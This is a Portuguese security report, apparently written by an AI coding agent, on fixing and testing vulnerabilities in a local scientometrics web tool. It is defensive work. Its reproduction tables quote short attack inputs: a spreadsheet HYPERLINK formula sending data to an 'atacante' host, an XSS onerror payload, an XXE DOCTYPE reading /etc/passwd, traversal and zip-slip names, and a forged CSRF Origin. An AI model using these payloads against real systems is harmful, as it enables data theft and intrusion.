# Relatório de segurança e estabilidade

Data: 10/11/2026 · Branch `feat/unificacao-cientometria` · Sem merge automático.

Princípio adotado: **uma correção só conta como feita quando um teste automatizado demonstra que o
ataque deixou de funcionar**. Por isso cada vulnerabilidade tem (1) a reprodução antes da correção,
(2) a correção, (3) o teste automatizado que tenta o ataque e (4) o risco residual. Além dos testes de
unidade/integração, um **script de caixa-preta** (`scripts/validacao_seguranca.py`) executa os ataques
pela rede, sem ler o código, e foi rodado **sem modificação** contra três versões e contra o contêiner
Docker (§3). As saídas brutas estão em `docs/evidencias/`.

Versões comparadas:

| Versão | Commit | Situação |
|---|---|---|
| Antes da revisão de segurança | `b1414c0` | estado do PR após a unificação |
| Após a rodada 2 | `8fc05f9` | 10 achados de segurança + 3 de persistência corrigidos |
| Após a rodada 3 (atual) | `d71479d` + este commit | 6 achados novos corrigidos (+ H2 no modo Docker) |
| Rodada 4: exportação/importação de execução (.zip) | branch `claudinho/magical-allen-ehxbar` | nova superfície de upload (V11, §1a) + 1 achado na camada de upload existente (V12) |

## 1. Vulnerabilidades: reprodução, correção, teste e risco residual

Severidade considerando o uso previsto (ferramenta local de pesquisa que manipula exportações
licenciadas): **Alta** = acesso a dados ou execução de código no navegador sem interação especial;
**Média** = exige condição adicional; **Baixa** = impacto limitado.

| ID | Sev. | Vulnerabilidade | Como foi reproduzida antes | Correção | Teste(s) automatizado(s) | Risco residual |
|---|---|---|---|---|---|---|
| V1 | Alta | `php -S` servia qualquer arquivo: exportações licenciadas em `projetos/`, `.git`, código | `GET /projetos/<p>/arquivos.json`, `/.git/HEAD`, `/cientometria/api.py` → 200 (caixa-preta em `b1414c0`) | `router.php` serve só os 5 pontos de entrada e o JS empacotado; `.htaccess` equivalente; Docker com dados em `/dados` | `test_seguranca.py::test_roteador_nao_serve_arquivos_internos` (10 caminhos), `::test_relatorios_so_por_caminho_valido`; caixa-preta V1 | Quem servir com outro servidor web precisa replicar a regra (`.htaccess` só cobre Apache; não testado em Apache) |
| V2 | Alta | Traversal no identificador do projeto | `{"projeto": "../projetos/<slug>"}` abria o projeto (HTTP 200) | regex `^[a-z0-9][a-z0-9-]{0,80}$` + confinamento na raiz; IDs de execução/arquivo validados | `::test_slug_invalido_rejeitado` (8 casos), `::test_id_de_execucao_invalido` (5), `::test_traversal_e_upload_pela_api`; `test_regressao.py::test_api_rejeita_entradas_invalidas`; caixa-preta V2 | — |
| V3 | Alta | CSRF: qualquer site podia acionar a API | POST `text/plain` com `Origin: http://atacante.example` criou projeto (200) | token CSRF por sessão (cookie HttpOnly, SameSite=Strict), Origin/Referer, só POST | `::test_csrf_e_origem`; caixa-preta V3 | — |
| V4 | Alta | Acesso remoto sem credenciais | GET por IP não-loopback → 200, também com `Host: localhost` falsificado | sem credenciais, só loopback; HTTP Basic (`CIENTOMETRIA_USUARIO`, `CIENTOMETRIA_SENHA_HASH`) | `::test_autenticacao_basic`; caixa-preta V4 (IP 192.0.2.2) | HTTP Basic sem TLS expõe a senha na rede: usar HTTPS (proxy reverso). Sem limite de tentativas |
| V5 | Alta | XSS armazenado: título de exportação executava JavaScript na triagem rápida | título `<img src=x onerror=…>` executou no Chromium (caixa-preta V5 em `b1414c0`) | escape em todas as interpolações; CSP `script-src 'nonce-…'`; sem handlers inline | `::test_interface_escapa_dados_dos_arquivos`, `::test_cabecalhos_de_seguranca`; `test_interface.py::test_triagem_rapida` e `::test_fluxo_completo_do_dashboard` (navegador real, nome/descrição de projeto maliciosos); caixa-preta V5 | `style-src 'unsafe-inline'` permanece (estilos inline); JS ainda inline com nonce |
| V6 | Média | Uploads e payload gravados no webroot durante o processamento | 10 arquivos observados em `tmp_uploads/` durante uma triagem (caixa-preta V6) | diretório temporário fora do webroot (0700), removido ao fim | `::test_triagem_rapida_sem_arquivos_no_webroot`; caixa-preta V6 | — |
| V7 | Média | Upload de conteúdo incompatível com a extensão | binário com nome `.csv` aceito e registrado (200) | extensão, tamanho, quantidade, bytes nulos, ZIP/OLE válidos, limite de descompactação, sem links simbólicos, importação confinada, arquivos somente leitura | `::test_conteudo_incompativel_com_extensao`, `::test_xlsx_bomba_de_compressao`, `::test_importacao_confinada_ao_diretorio_permitido`, `::test_nome_de_arquivo_saneado`, `::test_arquivo_importado_fica_somente_leitura`, `::test_traversal_e_upload_pela_api`; caixa-preta V7 | Validação é estrutural: um CSV bem formado com conteúdo hostil é aceito (e tratado como texto) |
| V8 | Média | Chart.js de CDN sem versão fixa nem SRI | `<script src="https://cdn.jsdelivr.net/npm/chart.js">` | Chart.js 4.4.1 empacotado (MIT) com SRI sha384 | `::test_biblioteca_js_local_com_sri`, `::test_roteador_serve_so_a_biblioteca_empacotada`; caixa-preta V8 | Atualizações do Chart.js passam a ser manuais |
| V9 | Média | Custo ilimitado: `n_sensibilidade` arbitrário | 10⁷ sorteios aceitos; requisição ainda processando após 60 s (caixa-preta V9) | limite de 20.000 | `::test_sensibilidade_limitada`; caixa-preta V9 | ver H6 |
| V10 | Baixa | Caminhos absolutos em mensagens de erro | `Projeto não encontrado: /tmp/…/projetos/…` | caminhos substituídos por `<…>`; erros do Python sem caminho | `::test_traversal_e_upload_pela_api` (`str(raiz) not in r.text`); caixa-preta V10 | Mensagens ainda nomeiam o tipo da exceção |
| H1 | Alta | **DNS rebinding**: site malicioso com DNS apontado para 127.0.0.1 controlava a API | `Host`/`Origin` do domínio do atacante → página 200 (com token CSRF legível) e API 200 | `Host` restrito a localhost/127.0.0.1/[::1] ou `CIENTOMETRIA_HOSTS` (HTTP 421) | `::test_dns_rebinding_host_externo_bloqueado`; caixa-preta H1 | Quem incluir um nome em `CIENTOMETRIA_HOSTS` deve usar credenciais |
| H2 | Média | Atrás de proxy reverso no mesmo host, todo cliente parecia local e dispensava senha | `X-Forwarded-For: 203.0.113.9` → 200 | cabeçalhos de proxy tornam a requisição remota; senha exigida mesmo com `CIENTOMETRIA_PERMITIR_SEM_SENHA=1` | `::test_atras_de_proxy_reverso_exige_credenciais` (4 cabeçalhos), `::test_permitir_sem_senha_nao_vale_atras_de_proxy`; caixa-preta H2 | Um proxy que não envie nenhum desses cabeçalhos não é detectado |
| H3 | Média | Triagem rápida sem a validação de conteúdo da importação | `.xlsx` com `<!DOCTYPE … SYSTEM "file:///etc/passwd">` processado (HTTP 500 após tentar ler) | mesma validação de `ingestao.validar_conteudo`; entrada rejeitada → 422 | `::test_triagem_rapida_valida_conteudo`; `test_interface.py::test_triagem_rapida`; caixa-preta H3 | — |
| H4 | Baixa | `atualizar_projeto` sem validação de tipo/tamanho/chaves | nome com 200 mil caracteres aceito (200) | tipos, tamanhos e chaves permitidas; `slug`/datas não editáveis | `::test_atualizar_projeto_valida_campos` (9 casos); caixa-preta H4 | — |
| H5 | Média | **Injeção de fórmula** no XLSX/CSV de relatório | título `=HYPERLINK("http://atacante/?d="&A2,…)` gravado como fórmula (`data_type='f'`) | células XLSX forçadas a texto (conteúdo preservado); CSVs de relatório com prefixo `'` (OWASP); `corpus.csv` bruto intacto | `::test_relatorios_sem_injecao_de_formulas`; caixa-preta H5 | O `corpus.csv` bruto (não servido pela web) mantém o texto original; abri-lo direto numa planilha exige cuidado |
| H6 | Média | Negação de serviço por arquivo pesado (bomba de descompactação válida) | `.xlsx` de 2,3 MB → 103 MB descompactados: 8 s e 262 MB por arquivo, até 50 arquivos por envio, sem teto | limites por processo: memória (`CIENTOMETRIA_MEMORIA_MAX_MB`, 6144) e tempo (`CIENTOMETRIA_TEMPO_MAX_S`, 3600) + `timeout` no PHP; descompactado ≤ 512 MiB | `::test_limites_de_recursos` (tempo e memória) | Dentro dos limites ainda é possível ocupar o servidor; sem fila nem limite de requisições simultâneas |
| P1 | Média | Importações simultâneas corrompiam `arquivos.json` | 16 processos, `b1414c0`: `JSONDecodeError` e falha da importação (via HTTP com 8 workers não se manifestou em 96 tentativas) | trava `fcntl`; temporário único + `fsync` + `rename` | `test_persistencia.py::test_importacoes_simultaneas_nao_perdem_registros` (64 em 16 processos), `::test_mesmo_arquivo_importado_em_paralelo_gera_um_registro`, `::test_criacao_simultanea_de_projetos_com_mesmo_nome`, `::test_execucoes_simultaneas_no_mesmo_projeto`; caixa-preta P1 | `fcntl` não protege sistemas de arquivos de rede sem suporte a travas (NFS antigo) |
| P2 | Média | Execução que falhava deixava resultado parcial | código; falha simulada | `.em_andamento_<id>` + renomeação atômica; `.falhas/<id>/erro.txt` | `::test_falha_durante_execucao_nao_deixa_resultado_parcial`, `::test_recuperacao_apos_queda` | — |
| P3 | Média | Execução sobre arquivo de entrada alterado; saídas sem verificação | arquivo adulterado era usado sem aviso | SHA-256 das entradas reconferido; manifesto com SHA-256 de cada saída; `verificar_execucao`, `recuperar`, `reconstruir_registro` | `::test_arquivo_original_alterado_impede_execucao`, `::test_manifesto_consistente_e_saidas_verificaveis`, `::test_registro_corrompido_e_reconstrucao`, `::test_execucao_concluida_nunca_e_sobrescrita` | Como root (fora do Docker) a cópia somente leitura pode ser alterada; a adulteração é detectada, não impedida |
| V11 | Alta (superfície nova) | **Upload de pacote .zip de execução** (`importar_execucao`): traversal (`../`, absolutos, `\`), links simbólicos, bomba de descompactação, sobrescrita de execução existente, resultado adulterado aceito como legítimo | superfície criada nesta rodada: cada ataque foi montado como .zip real e executado contra a importação (análise em §1a) | `cientometria/pacote.py`: lista de membros validada **antes** de extrair; estrutura fixa; limites de .zip/membros/descompactado (declarado **e** contado); extração em pasta oculta do projeto; SHA-256 de cada saída × `saidas_sha256` e hash do corpus recalculado (`Projeto.conferir_saidas`, o mesmo de `verificar_execucao`); publicação por `rename` sob `_trava`; ID repetido recusado; arquivos 0444; PHP: só `.zip`, 1 arquivo, `CIENTOMETRIA_MAX_MB_ZIP`, via `seg_receber_uploads`, confinado a `CIENTOMETRIA_DIR_IMPORTACAO` | `test_pacote_execucao.py` (40): `::test_caminho_perigoso_e_recusado` (14 nomes), `::test_link_simbolico_no_zip_e_recusado` (2), `::test_arquivo_especial_e_duas_pastas_recusados`, `::test_zip_bomba_recusado_antes_de_extrair`, `::test_zip_bomba_com_tamanho_falsificado_no_cabecalho`, `::test_limite_de_membros_e_de_tamanho_do_zip`, `::test_pacote_adulterado_e_recusado` (8), `::test_entrada_que_nao_consta_do_manifesto_e_recusada`, `::test_id_repetido_nao_sobrescreve`, `::test_pacote_por_link_simbolico_ou_fora_do_diretorio_permitido`, `::test_http_exportar_e_importar`, `::test_http_limites_e_temporarios_removidos`; `test_interface.py::test_exportar_e_importar_execucao_zip` (Chromium, CSP ativo) | Hashes do pacote provam consistência **interna**, não autoria (§1a, R1). Dentro dos limites, um .zip de 200 MiB/1 GiB descompactado ainda ocupa disco e CPU |
| V12 | Média | **Upload recusado no meio deixava arquivos no diretório temporário** (`exit()`/`seg_negar()` do PHP não executa `finally`): 1º arquivo (exportação licenciada) ficava em `CIENTOMETRIA_DIR_UPLOAD` | em `adfa0e1`: `importar` com `[lens-export.csv, x.php]` → HTTP 415 e `up_<…>/000_lens-export.csv` permanecia no disco (reproduzido com `php -S`; depois da correção: nenhum arquivo) | `seg_diretorio_temporario()` agenda `seg_remover_diretorio()` com `register_shutdown_function` (vale para todos os endpoints: importação, .zip, triagem rápida, payloads) | `test_pacote_execucao.py::test_http_limites_e_temporarios_removidos` (falha sem a correção, passa com ela) | Queda do processo PHP (kill -9) ainda deixa o temporário; o diretório é 0700 e fora do webroot |

**Hipóteses testadas e não confirmadas** (mantidas como teste de regressão): XXE e "billion laughs" em `.xlsx`
— rejeitados pelo leitor; reforço: `.xlsx` com `DOCTYPE` recusado e `defusedxml` instalado
(`::test_xlsx_com_doctype_rejeitado`). Injeção de comando nos `exec()` do PHP — todos os argumentos passam por
`escapeshellarg`; `bandit` sem achados.

## 1a. Análise da superfície de exportação/importação de execução (.zip)

**Por que existe.** Na auditoria da execução `052b2a400fc1` os arquivos de `relatorios/` chegaram sem
`manifesto.json`, e a proveniência teve de ser provada recalculando o hash do corpus
(`docs/AUDITORIA_RESULTADOS_BIBLIOMETRICOS.md`, §2, §9, recomendação 12). O .zip leva a pasta inteira da
execução e torna cada arquivo verificável.

**Fluxos e fronteiras de confiança.**

| Fluxo | Entrada não confiável | Controles |
|---|---|---|
| `POST api.php?acao=exportar_execucao` (JSON `projeto`, `id`, `incluir_entradas`) | identificadores | `seg_exigir_post_protegido()` (acesso, Host, origem, CSRF); regex de projeto e de execução no PHP **e** no Python; `incluir_entradas` só com booleano `true`; o caminho de destino **nunca** vem do payload (`CIENTOMETRIA_DIR_EXPORTACAO`, temporário 0700 fora do webroot, apagado após o envio); nome do .zip conferido por regex e `realpath` antes do `readfile`; resposta `attachment` com CSP `sandbox` |
| `POST api.php?acao=importar_execucao` (multipart, 1 arquivo) | o .zip inteiro | `seg_exigir_post_protegido()`; `seg_receber_uploads($dir, ['zip'], 1, seg_limite_zip())`; Python confinado a `CIENTOMETRIA_DIR_IMPORTACAO`; validações abaixo |
| CLI `exportar-execucao` / `importar-execucao` | arquivo local | as mesmas funções (`cientometria/pacote.py`) |

**Ameaças à importação e como cada uma é tratada** (todas com teste em `tests/test_pacote_execucao.py`):

| Ameaça | Controle |
|---|---|
| Traversal / zip-slip (`../x`, `/abs`, `C:/x`, `a\..\b`, `./`, `//`) | nomes validados segmento a segmento (`[A-Za-z0-9._-]`, sem `.`/`..`/vazio, sem `\`, NUL, letra de unidade); só são aceitos `LEIA-ME.txt`, `SHA256SUMS.txt`, **uma** pasta `<AAAAMMDDTHHMMSSZ>_<id>/` e `entradas/<arquivo>`; cada destino ainda é conferido com `_dentro()` e criado com `open(..., "xb")` (nunca sobrescreve) |
| Link simbólico / arquivo especial no .zip | atributos Unix (`external_attr`) com `S_IFLNK`, FIFO, dispositivo etc. → recusa; nada é extraído com `extractall` |
| Link simbólico no lugar do .zip enviado | recusa (`is_symlink`) |
| Nomes duplicados (inclusive só por caixa) e arquivo/pasta com o mesmo nome | recusa |
| Bomba de descompactação | limites `CIENTOMETRIA_MAX_MB_ZIP` (200), `CIENTOMETRIA_MAX_MEMBROS_ZIP` (5.000) e `CIENTOMETRIA_MAX_MB_DESCOMPACTADO` (1.024): a soma dos tamanhos declarados é conferida **antes** de extrair, e a extração conta os bytes reais (o cabeçalho pode mentir: teste com `file_size` falsificado para 10 bytes e 32 MiB reais). .zip aninhado nunca é aberto. Membros cifrados recusados. Limites de memória/tempo do processo (H6) continuam valendo |
| Pacote adulterado (arquivo alterado, acrescentado ou removido; manifesto ausente ou sem `saidas_sha256`) | todo arquivo da pasta × `manifesto.json["saidas_sha256"]` (conjunto e conteúdo) e hash do corpus recalculado de `corpus.csv` — `Projeto.conferir_saidas`, o mesmo código de `verificar_execucao`. Entradas incluídas precisam constar de `manifesto.json["fontes"]` (SHA-256) |
| Sobrescrita de execução existente / corrida entre importações | ID já presente no projeto → recusa (`FileExistsError`, "nada foi importado nem sobrescrito"), verificado sob `_trava()`; publicação por `rename` atômico de uma pasta oculta `.importando_<uuid>` (não listada); falha no meio → temporário removido (`recuperar()` também o remove após queda) |
| Execução importada usada como se fosse local | registro em `execucoes/.importadas/<pasta>.json` (data, nome e SHA-256 do .zip, entradas), arquivos 0444, marca "importada" na lista e no histórico (`execucao_importada`); `reproduzir` recusa execução importada; `verificar_execucao` não exige as entradas no projeto (relata em `avisos`) mas reconfere as que vieram no .zip |
| XSS por conteúdo do pacote (rótulo, nomes) na interface | todos os campos passam por `esc()`; nomes de membros restritos a ASCII seguro; CSP inalterado (o download usa `blob:` sem relaxar o CSP — teste no Chromium) |
| Vazamento de dados licenciados | padrão **sem** entradas (opção desmarcada, aviso ao marcar, `LEIA-ME.txt` explícito); `.zip` no `.gitignore` e em `scripts/verificar_repositorio.py`; o .zip gerado pela web não fica no disco (V12 garante a remoção mesmo em erro) |

**Riscos residuais desta superfície.**

- **R1 — autenticidade ≠ integridade.** Quem altera um arquivo e recalcula `saidas_sha256` **e** `hash_corpus`
  no manifesto produz um pacote internamente consistente, que a importação aceita. O `hash_corpus` cobre só as
  colunas de `COLUNAS_CORPUS`; as demais colunas de `corpus.csv` e os outros arquivos dependem de
  `saidas_sha256`. Prova de autoria exige comparar o **SHA-256 do `manifesto.json`** (no `LEIA-ME.txt` e na
  interface após exportar) com um valor registrado por outro canal (artigo, ata, repositório de dados). Assinatura
  digital não foi implementada.
- **R2** — dentro dos limites, um pacote grande ainda consome disco e CPU (sem cota por projeto).
- **R3** — o script de caixa-preta `scripts/validacao_seguranca.py` **não** foi estendido a esta superfície: o
  seu SHA-256 está fixado em `docs/evidencias/validacao_seguranca.sha256` para comparação entre versões. A
  cobertura aqui é por testes de integração (HTTP real contra `php -S`) e de interface (Chromium).
- **R4** — como root (fora do Docker), a cópia 0444 pode ser alterada; a alteração é **detectada** por
  `verificar_execucao`, não impedida (igual a P3).

## 2. Evidências dos testes automatizados após as correções

Execução local completa após as correções (`docs/evidencias/testes_locais.txt`):

```
Execução local: 2026-11-10T18:50:34.524028+00:00 — 172 testes, falhas=0, erros=0, pulados=26, tempo=92s
  test_adaptador_dashboard         passou=  8 pulado=  0 falhou=  0
  test_bibliometria                passou=  8 pulado=  0 falhou=  0
  test_comparacao_r                passou=  0 pulado= 20 falhou=  0
  test_consolidacao                passou=  7 pulado=  0 falhou=  0
  test_dados_reais                 passou=  0 pulado=  6 falhou=  0
  test_equivalencia_original       passou=  3 pulado=  0 falhou=  0
  test_ingestao                    passou= 13 pulado=  0 falhou=  0
  test_interface                   passou=  2 pulado=  0 falhou=  0
  test_modos_e_robustez            passou=  9 pulado=  0 falhou=  0
  test_persistencia                passou= 12 pulado=  0 falhou=  0
  test_projetos_manifesto          passou=  8 pulado=  0 falhou=  0
  test_regressao                   passou= 17 pulado=  0 falhou=  0
  test_seguranca                   passou= 58 pulado=  0 falhou=  0
  test_volume                      passou=  1 pulado=  0 falhou=  0
```

Rodada 4 (exportação/importação .zip, V11–V12), execução local com Python 3.13 e PHP do sistema:
`191 passed, 35 skipped, 6 xfailed` (antes da rodada: `150 passed, 35 skipped, 6 xfailed`; os pulados são os
mesmos — comparação com o R e dados reais indisponíveis); `ruff`, `bandit`, `php -l` e
`scripts/verificar_repositorio.py` sem achados.

Dentro do contêiner (Python 3.11, PHP 8.3, usuário sem privilégios, código somente leitura): `144 passed, 28 skipped` (`docs/evidencias/testes_no_conteiner.txt`; os 2 testes de interface são pulados porque a imagem de produção não inclui navegador).

Com dados reais não versionados (`docs/evidencias/testes_dados_reais.txt`): 22 passaram (comparação com o R e
consistência do corpus publicado) — os resultados científicos não mudaram com as correções. Os 4 testes com as
exportações originais continuam pulados (arquivos indisponíveis).

Verificações estáticas: `ruff` sem achados; `bandit` sem achados (0 em ~3,4 mil linhas); `pip-audit` sem
vulnerabilidades conhecidas na árvore completa de dependências; `php -l` sem erros; arquivos congelados do modo original inalterados.

## 3. Validação em caixa-preta (mesmo script nas três versões e no Docker)

Script: `scripts/validacao_seguranca.py` (SHA-256 em `docs/evidencias/validacao_seguranca.sha256`), executado
**sem modificação** em cada versão, servidor `php -S` com 8 workers e configuração padrão (projetos dentro
da pasta da aplicação), acesso remoto testado por IP não-loopback (192.0.2.2). Saídas completas:
`docs/evidencias/validacao_<versão>.txt|json`.

| ID | Vulnerabilidade | `b1414c0` (antes da revisão) | `8fc05f9` (após rodada 2) | `atual` (após rodada 3) | `docker` (Docker (atual)) |
|---|---|---|---|---|---|
| V1 | Arquivos internos servidos (projetos/, .git, código) | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V2 | Path traversal no identificador do projeto | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V3 | CSRF / origem não verificada | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V4 | Acesso remoto sem credenciais | **EXPLORÁVEL** | bloqueado | bloqueado | n/a |
| V5 | XSS armazenado via título de exportação | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V6 | Uploads gravados no webroot | **EXPLORÁVEL** | bloqueado | bloqueado | n/a |
| V7 | Upload de conteúdo incompatível com a extensão | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V8 | Script de CDN sem versão fixa/SRI | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V9 | Sorteios de sensibilidade sem limite | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V10 | Caminhos absolutos em mensagens de erro | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| H1 | DNS rebinding (Host do atacante) | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H2 | Proxy reverso local dispensa senha | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H3 | Triagem rápida sem validação de conteúdo | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H4 | Metadados do projeto sem validação | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H5 | Injeção de fórmula no XLSX do relatório | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| P1 | Importações simultâneas corrompem o registro | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| | **Total explorável** | **16** | **5** | **0** | **0** |

Observações:
- V4 no Docker: a porta é publicada só em 127.0.0.1 do host; pelo IP externo a conexão é recusada (`validacao_docker_v4.txt`).
- V6 no Docker: não se aplica (código em `/app` somente leitura; uploads em `/tmp`, tmpfs).
- P1: na versão antiga, 2 de 96 importações simultâneas falharam via HTTP; com 16 processos diretos, o registro
  JSON ficou ilegível. O Docker usa 1 worker PHP (concorrência serializada), por isso P1 é demonstrado no `php -S` com 8 workers e nos testes de processo.
- Evidência do V10 na versão antiga: a mensagem de erro continha `/tmp/claude-0/…/projetos/…`.

## 4. Regressão funcional

| Área | O que é verificado | Testes |
|---|---|---|
| Importação | 8 formatos, detecção de base, codificação, linhas ruins, entradas incompletas, ausência de DOI, retrato da importação (tipos, rótulos, contagens, SHA-256, cobertura de campos) | `test_ingestao.py` (13), `test_regressao.py::test_importacao_inalterada` (2) |
| Processamento | 4 modos × 2 cenários sintéticos: contagens, estratos, top 10, soma dos escores e hash do corpus idênticos ao retrato; modo original = scripts de referência; volume de 60 mil registros | `test_regressao.py::test_processamento_inalterado` (8), `test_equivalencia_original.py` (3), `test_modos_e_robustez.py` (9), `test_consolidacao.py` (7), `test_volume.py` |
| Persistência | concorrência, falha e queda simuladas, adulteração, recuperação, manifestos | `test_persistencia.py` (12), `test_projetos_manifesto.py` (8) |
| API | contrato de todas as ações e rejeição de entradas inválidas (Python); contrato JSON do adaptador; HTTP real com CSRF | `test_regressao.py::test_contrato_api`, `::test_api_rejeita_entradas_invalidas` (5), `test_adaptador_dashboard.py` (8), `test_seguranca.py` (HTTP) |
| Exportação/importação .zip | ida e volta (bytes idênticos, 0444, histórico, `verificar_execucao` ok), com e sem entradas, reexportação de execução importada, `LEIA-ME.txt` e `SHA256SUMS.txt`, CLI | `test_pacote_execucao.py` (40) |
| Interface | Chromium real com o CSP ativo: fluxo completo do dashboard (criar projeto com nome malicioso, importar, diagnosticar, executar 2 modos, comparar modos, bibliometria e gráficos, comparar execuções, reproduzir, baixar relatório), triagem rápida (execução, título malicioso, arquivo inválido) e exportar → baixar .zip → importar em outro projeto → marca "importada" e verificação ok → ID repetido recusado; zero erros de JavaScript/CSP | `test_interface.py` (3) |

O retrato do processamento (`tests/regressao/esperado.json`) usa dados sintéticos e não valida a reprodução do artigo.

## 5. Riscos residuais (consolidado)

1. **Sem TLS próprio**: para acesso remoto, colocar atrás de proxy HTTPS e configurar credenciais.
2. **Sem limite de tentativas de senha nem de taxa de requisições**.
3. **Negação de serviço dentro dos limites**: processos longos ainda ocupam o servidor; não há fila.
4. **CSP com `style-src 'unsafe-inline'`** e JavaScript inline (com nonce).
5. **`.htaccess` não testado** em Apache; o caminho suportado é `php -S … router.php` ou o Docker.
6. **Revisão por terceiros**: esta validação foi feita pelo mesmo agente que implementou as correções; o script
   de caixa-preta reduz, mas não elimina, esse viés. Recomenda-se revisão humana independente.
7. **Dados reais**: testes com as exportações originais não foram executados (arquivos indisponíveis).
8. **Pacotes .zip**: integridade interna não prova autoria (§1a, R1); compare o SHA-256 do `manifesto.json` com
   um registro externo.

## 6. Como repetir

```bash
python -m pytest -q
```

```bash
php -S 127.0.0.1:8000 router.php &
python scripts/validacao_seguranca.py --base http://127.0.0.1:8000
```
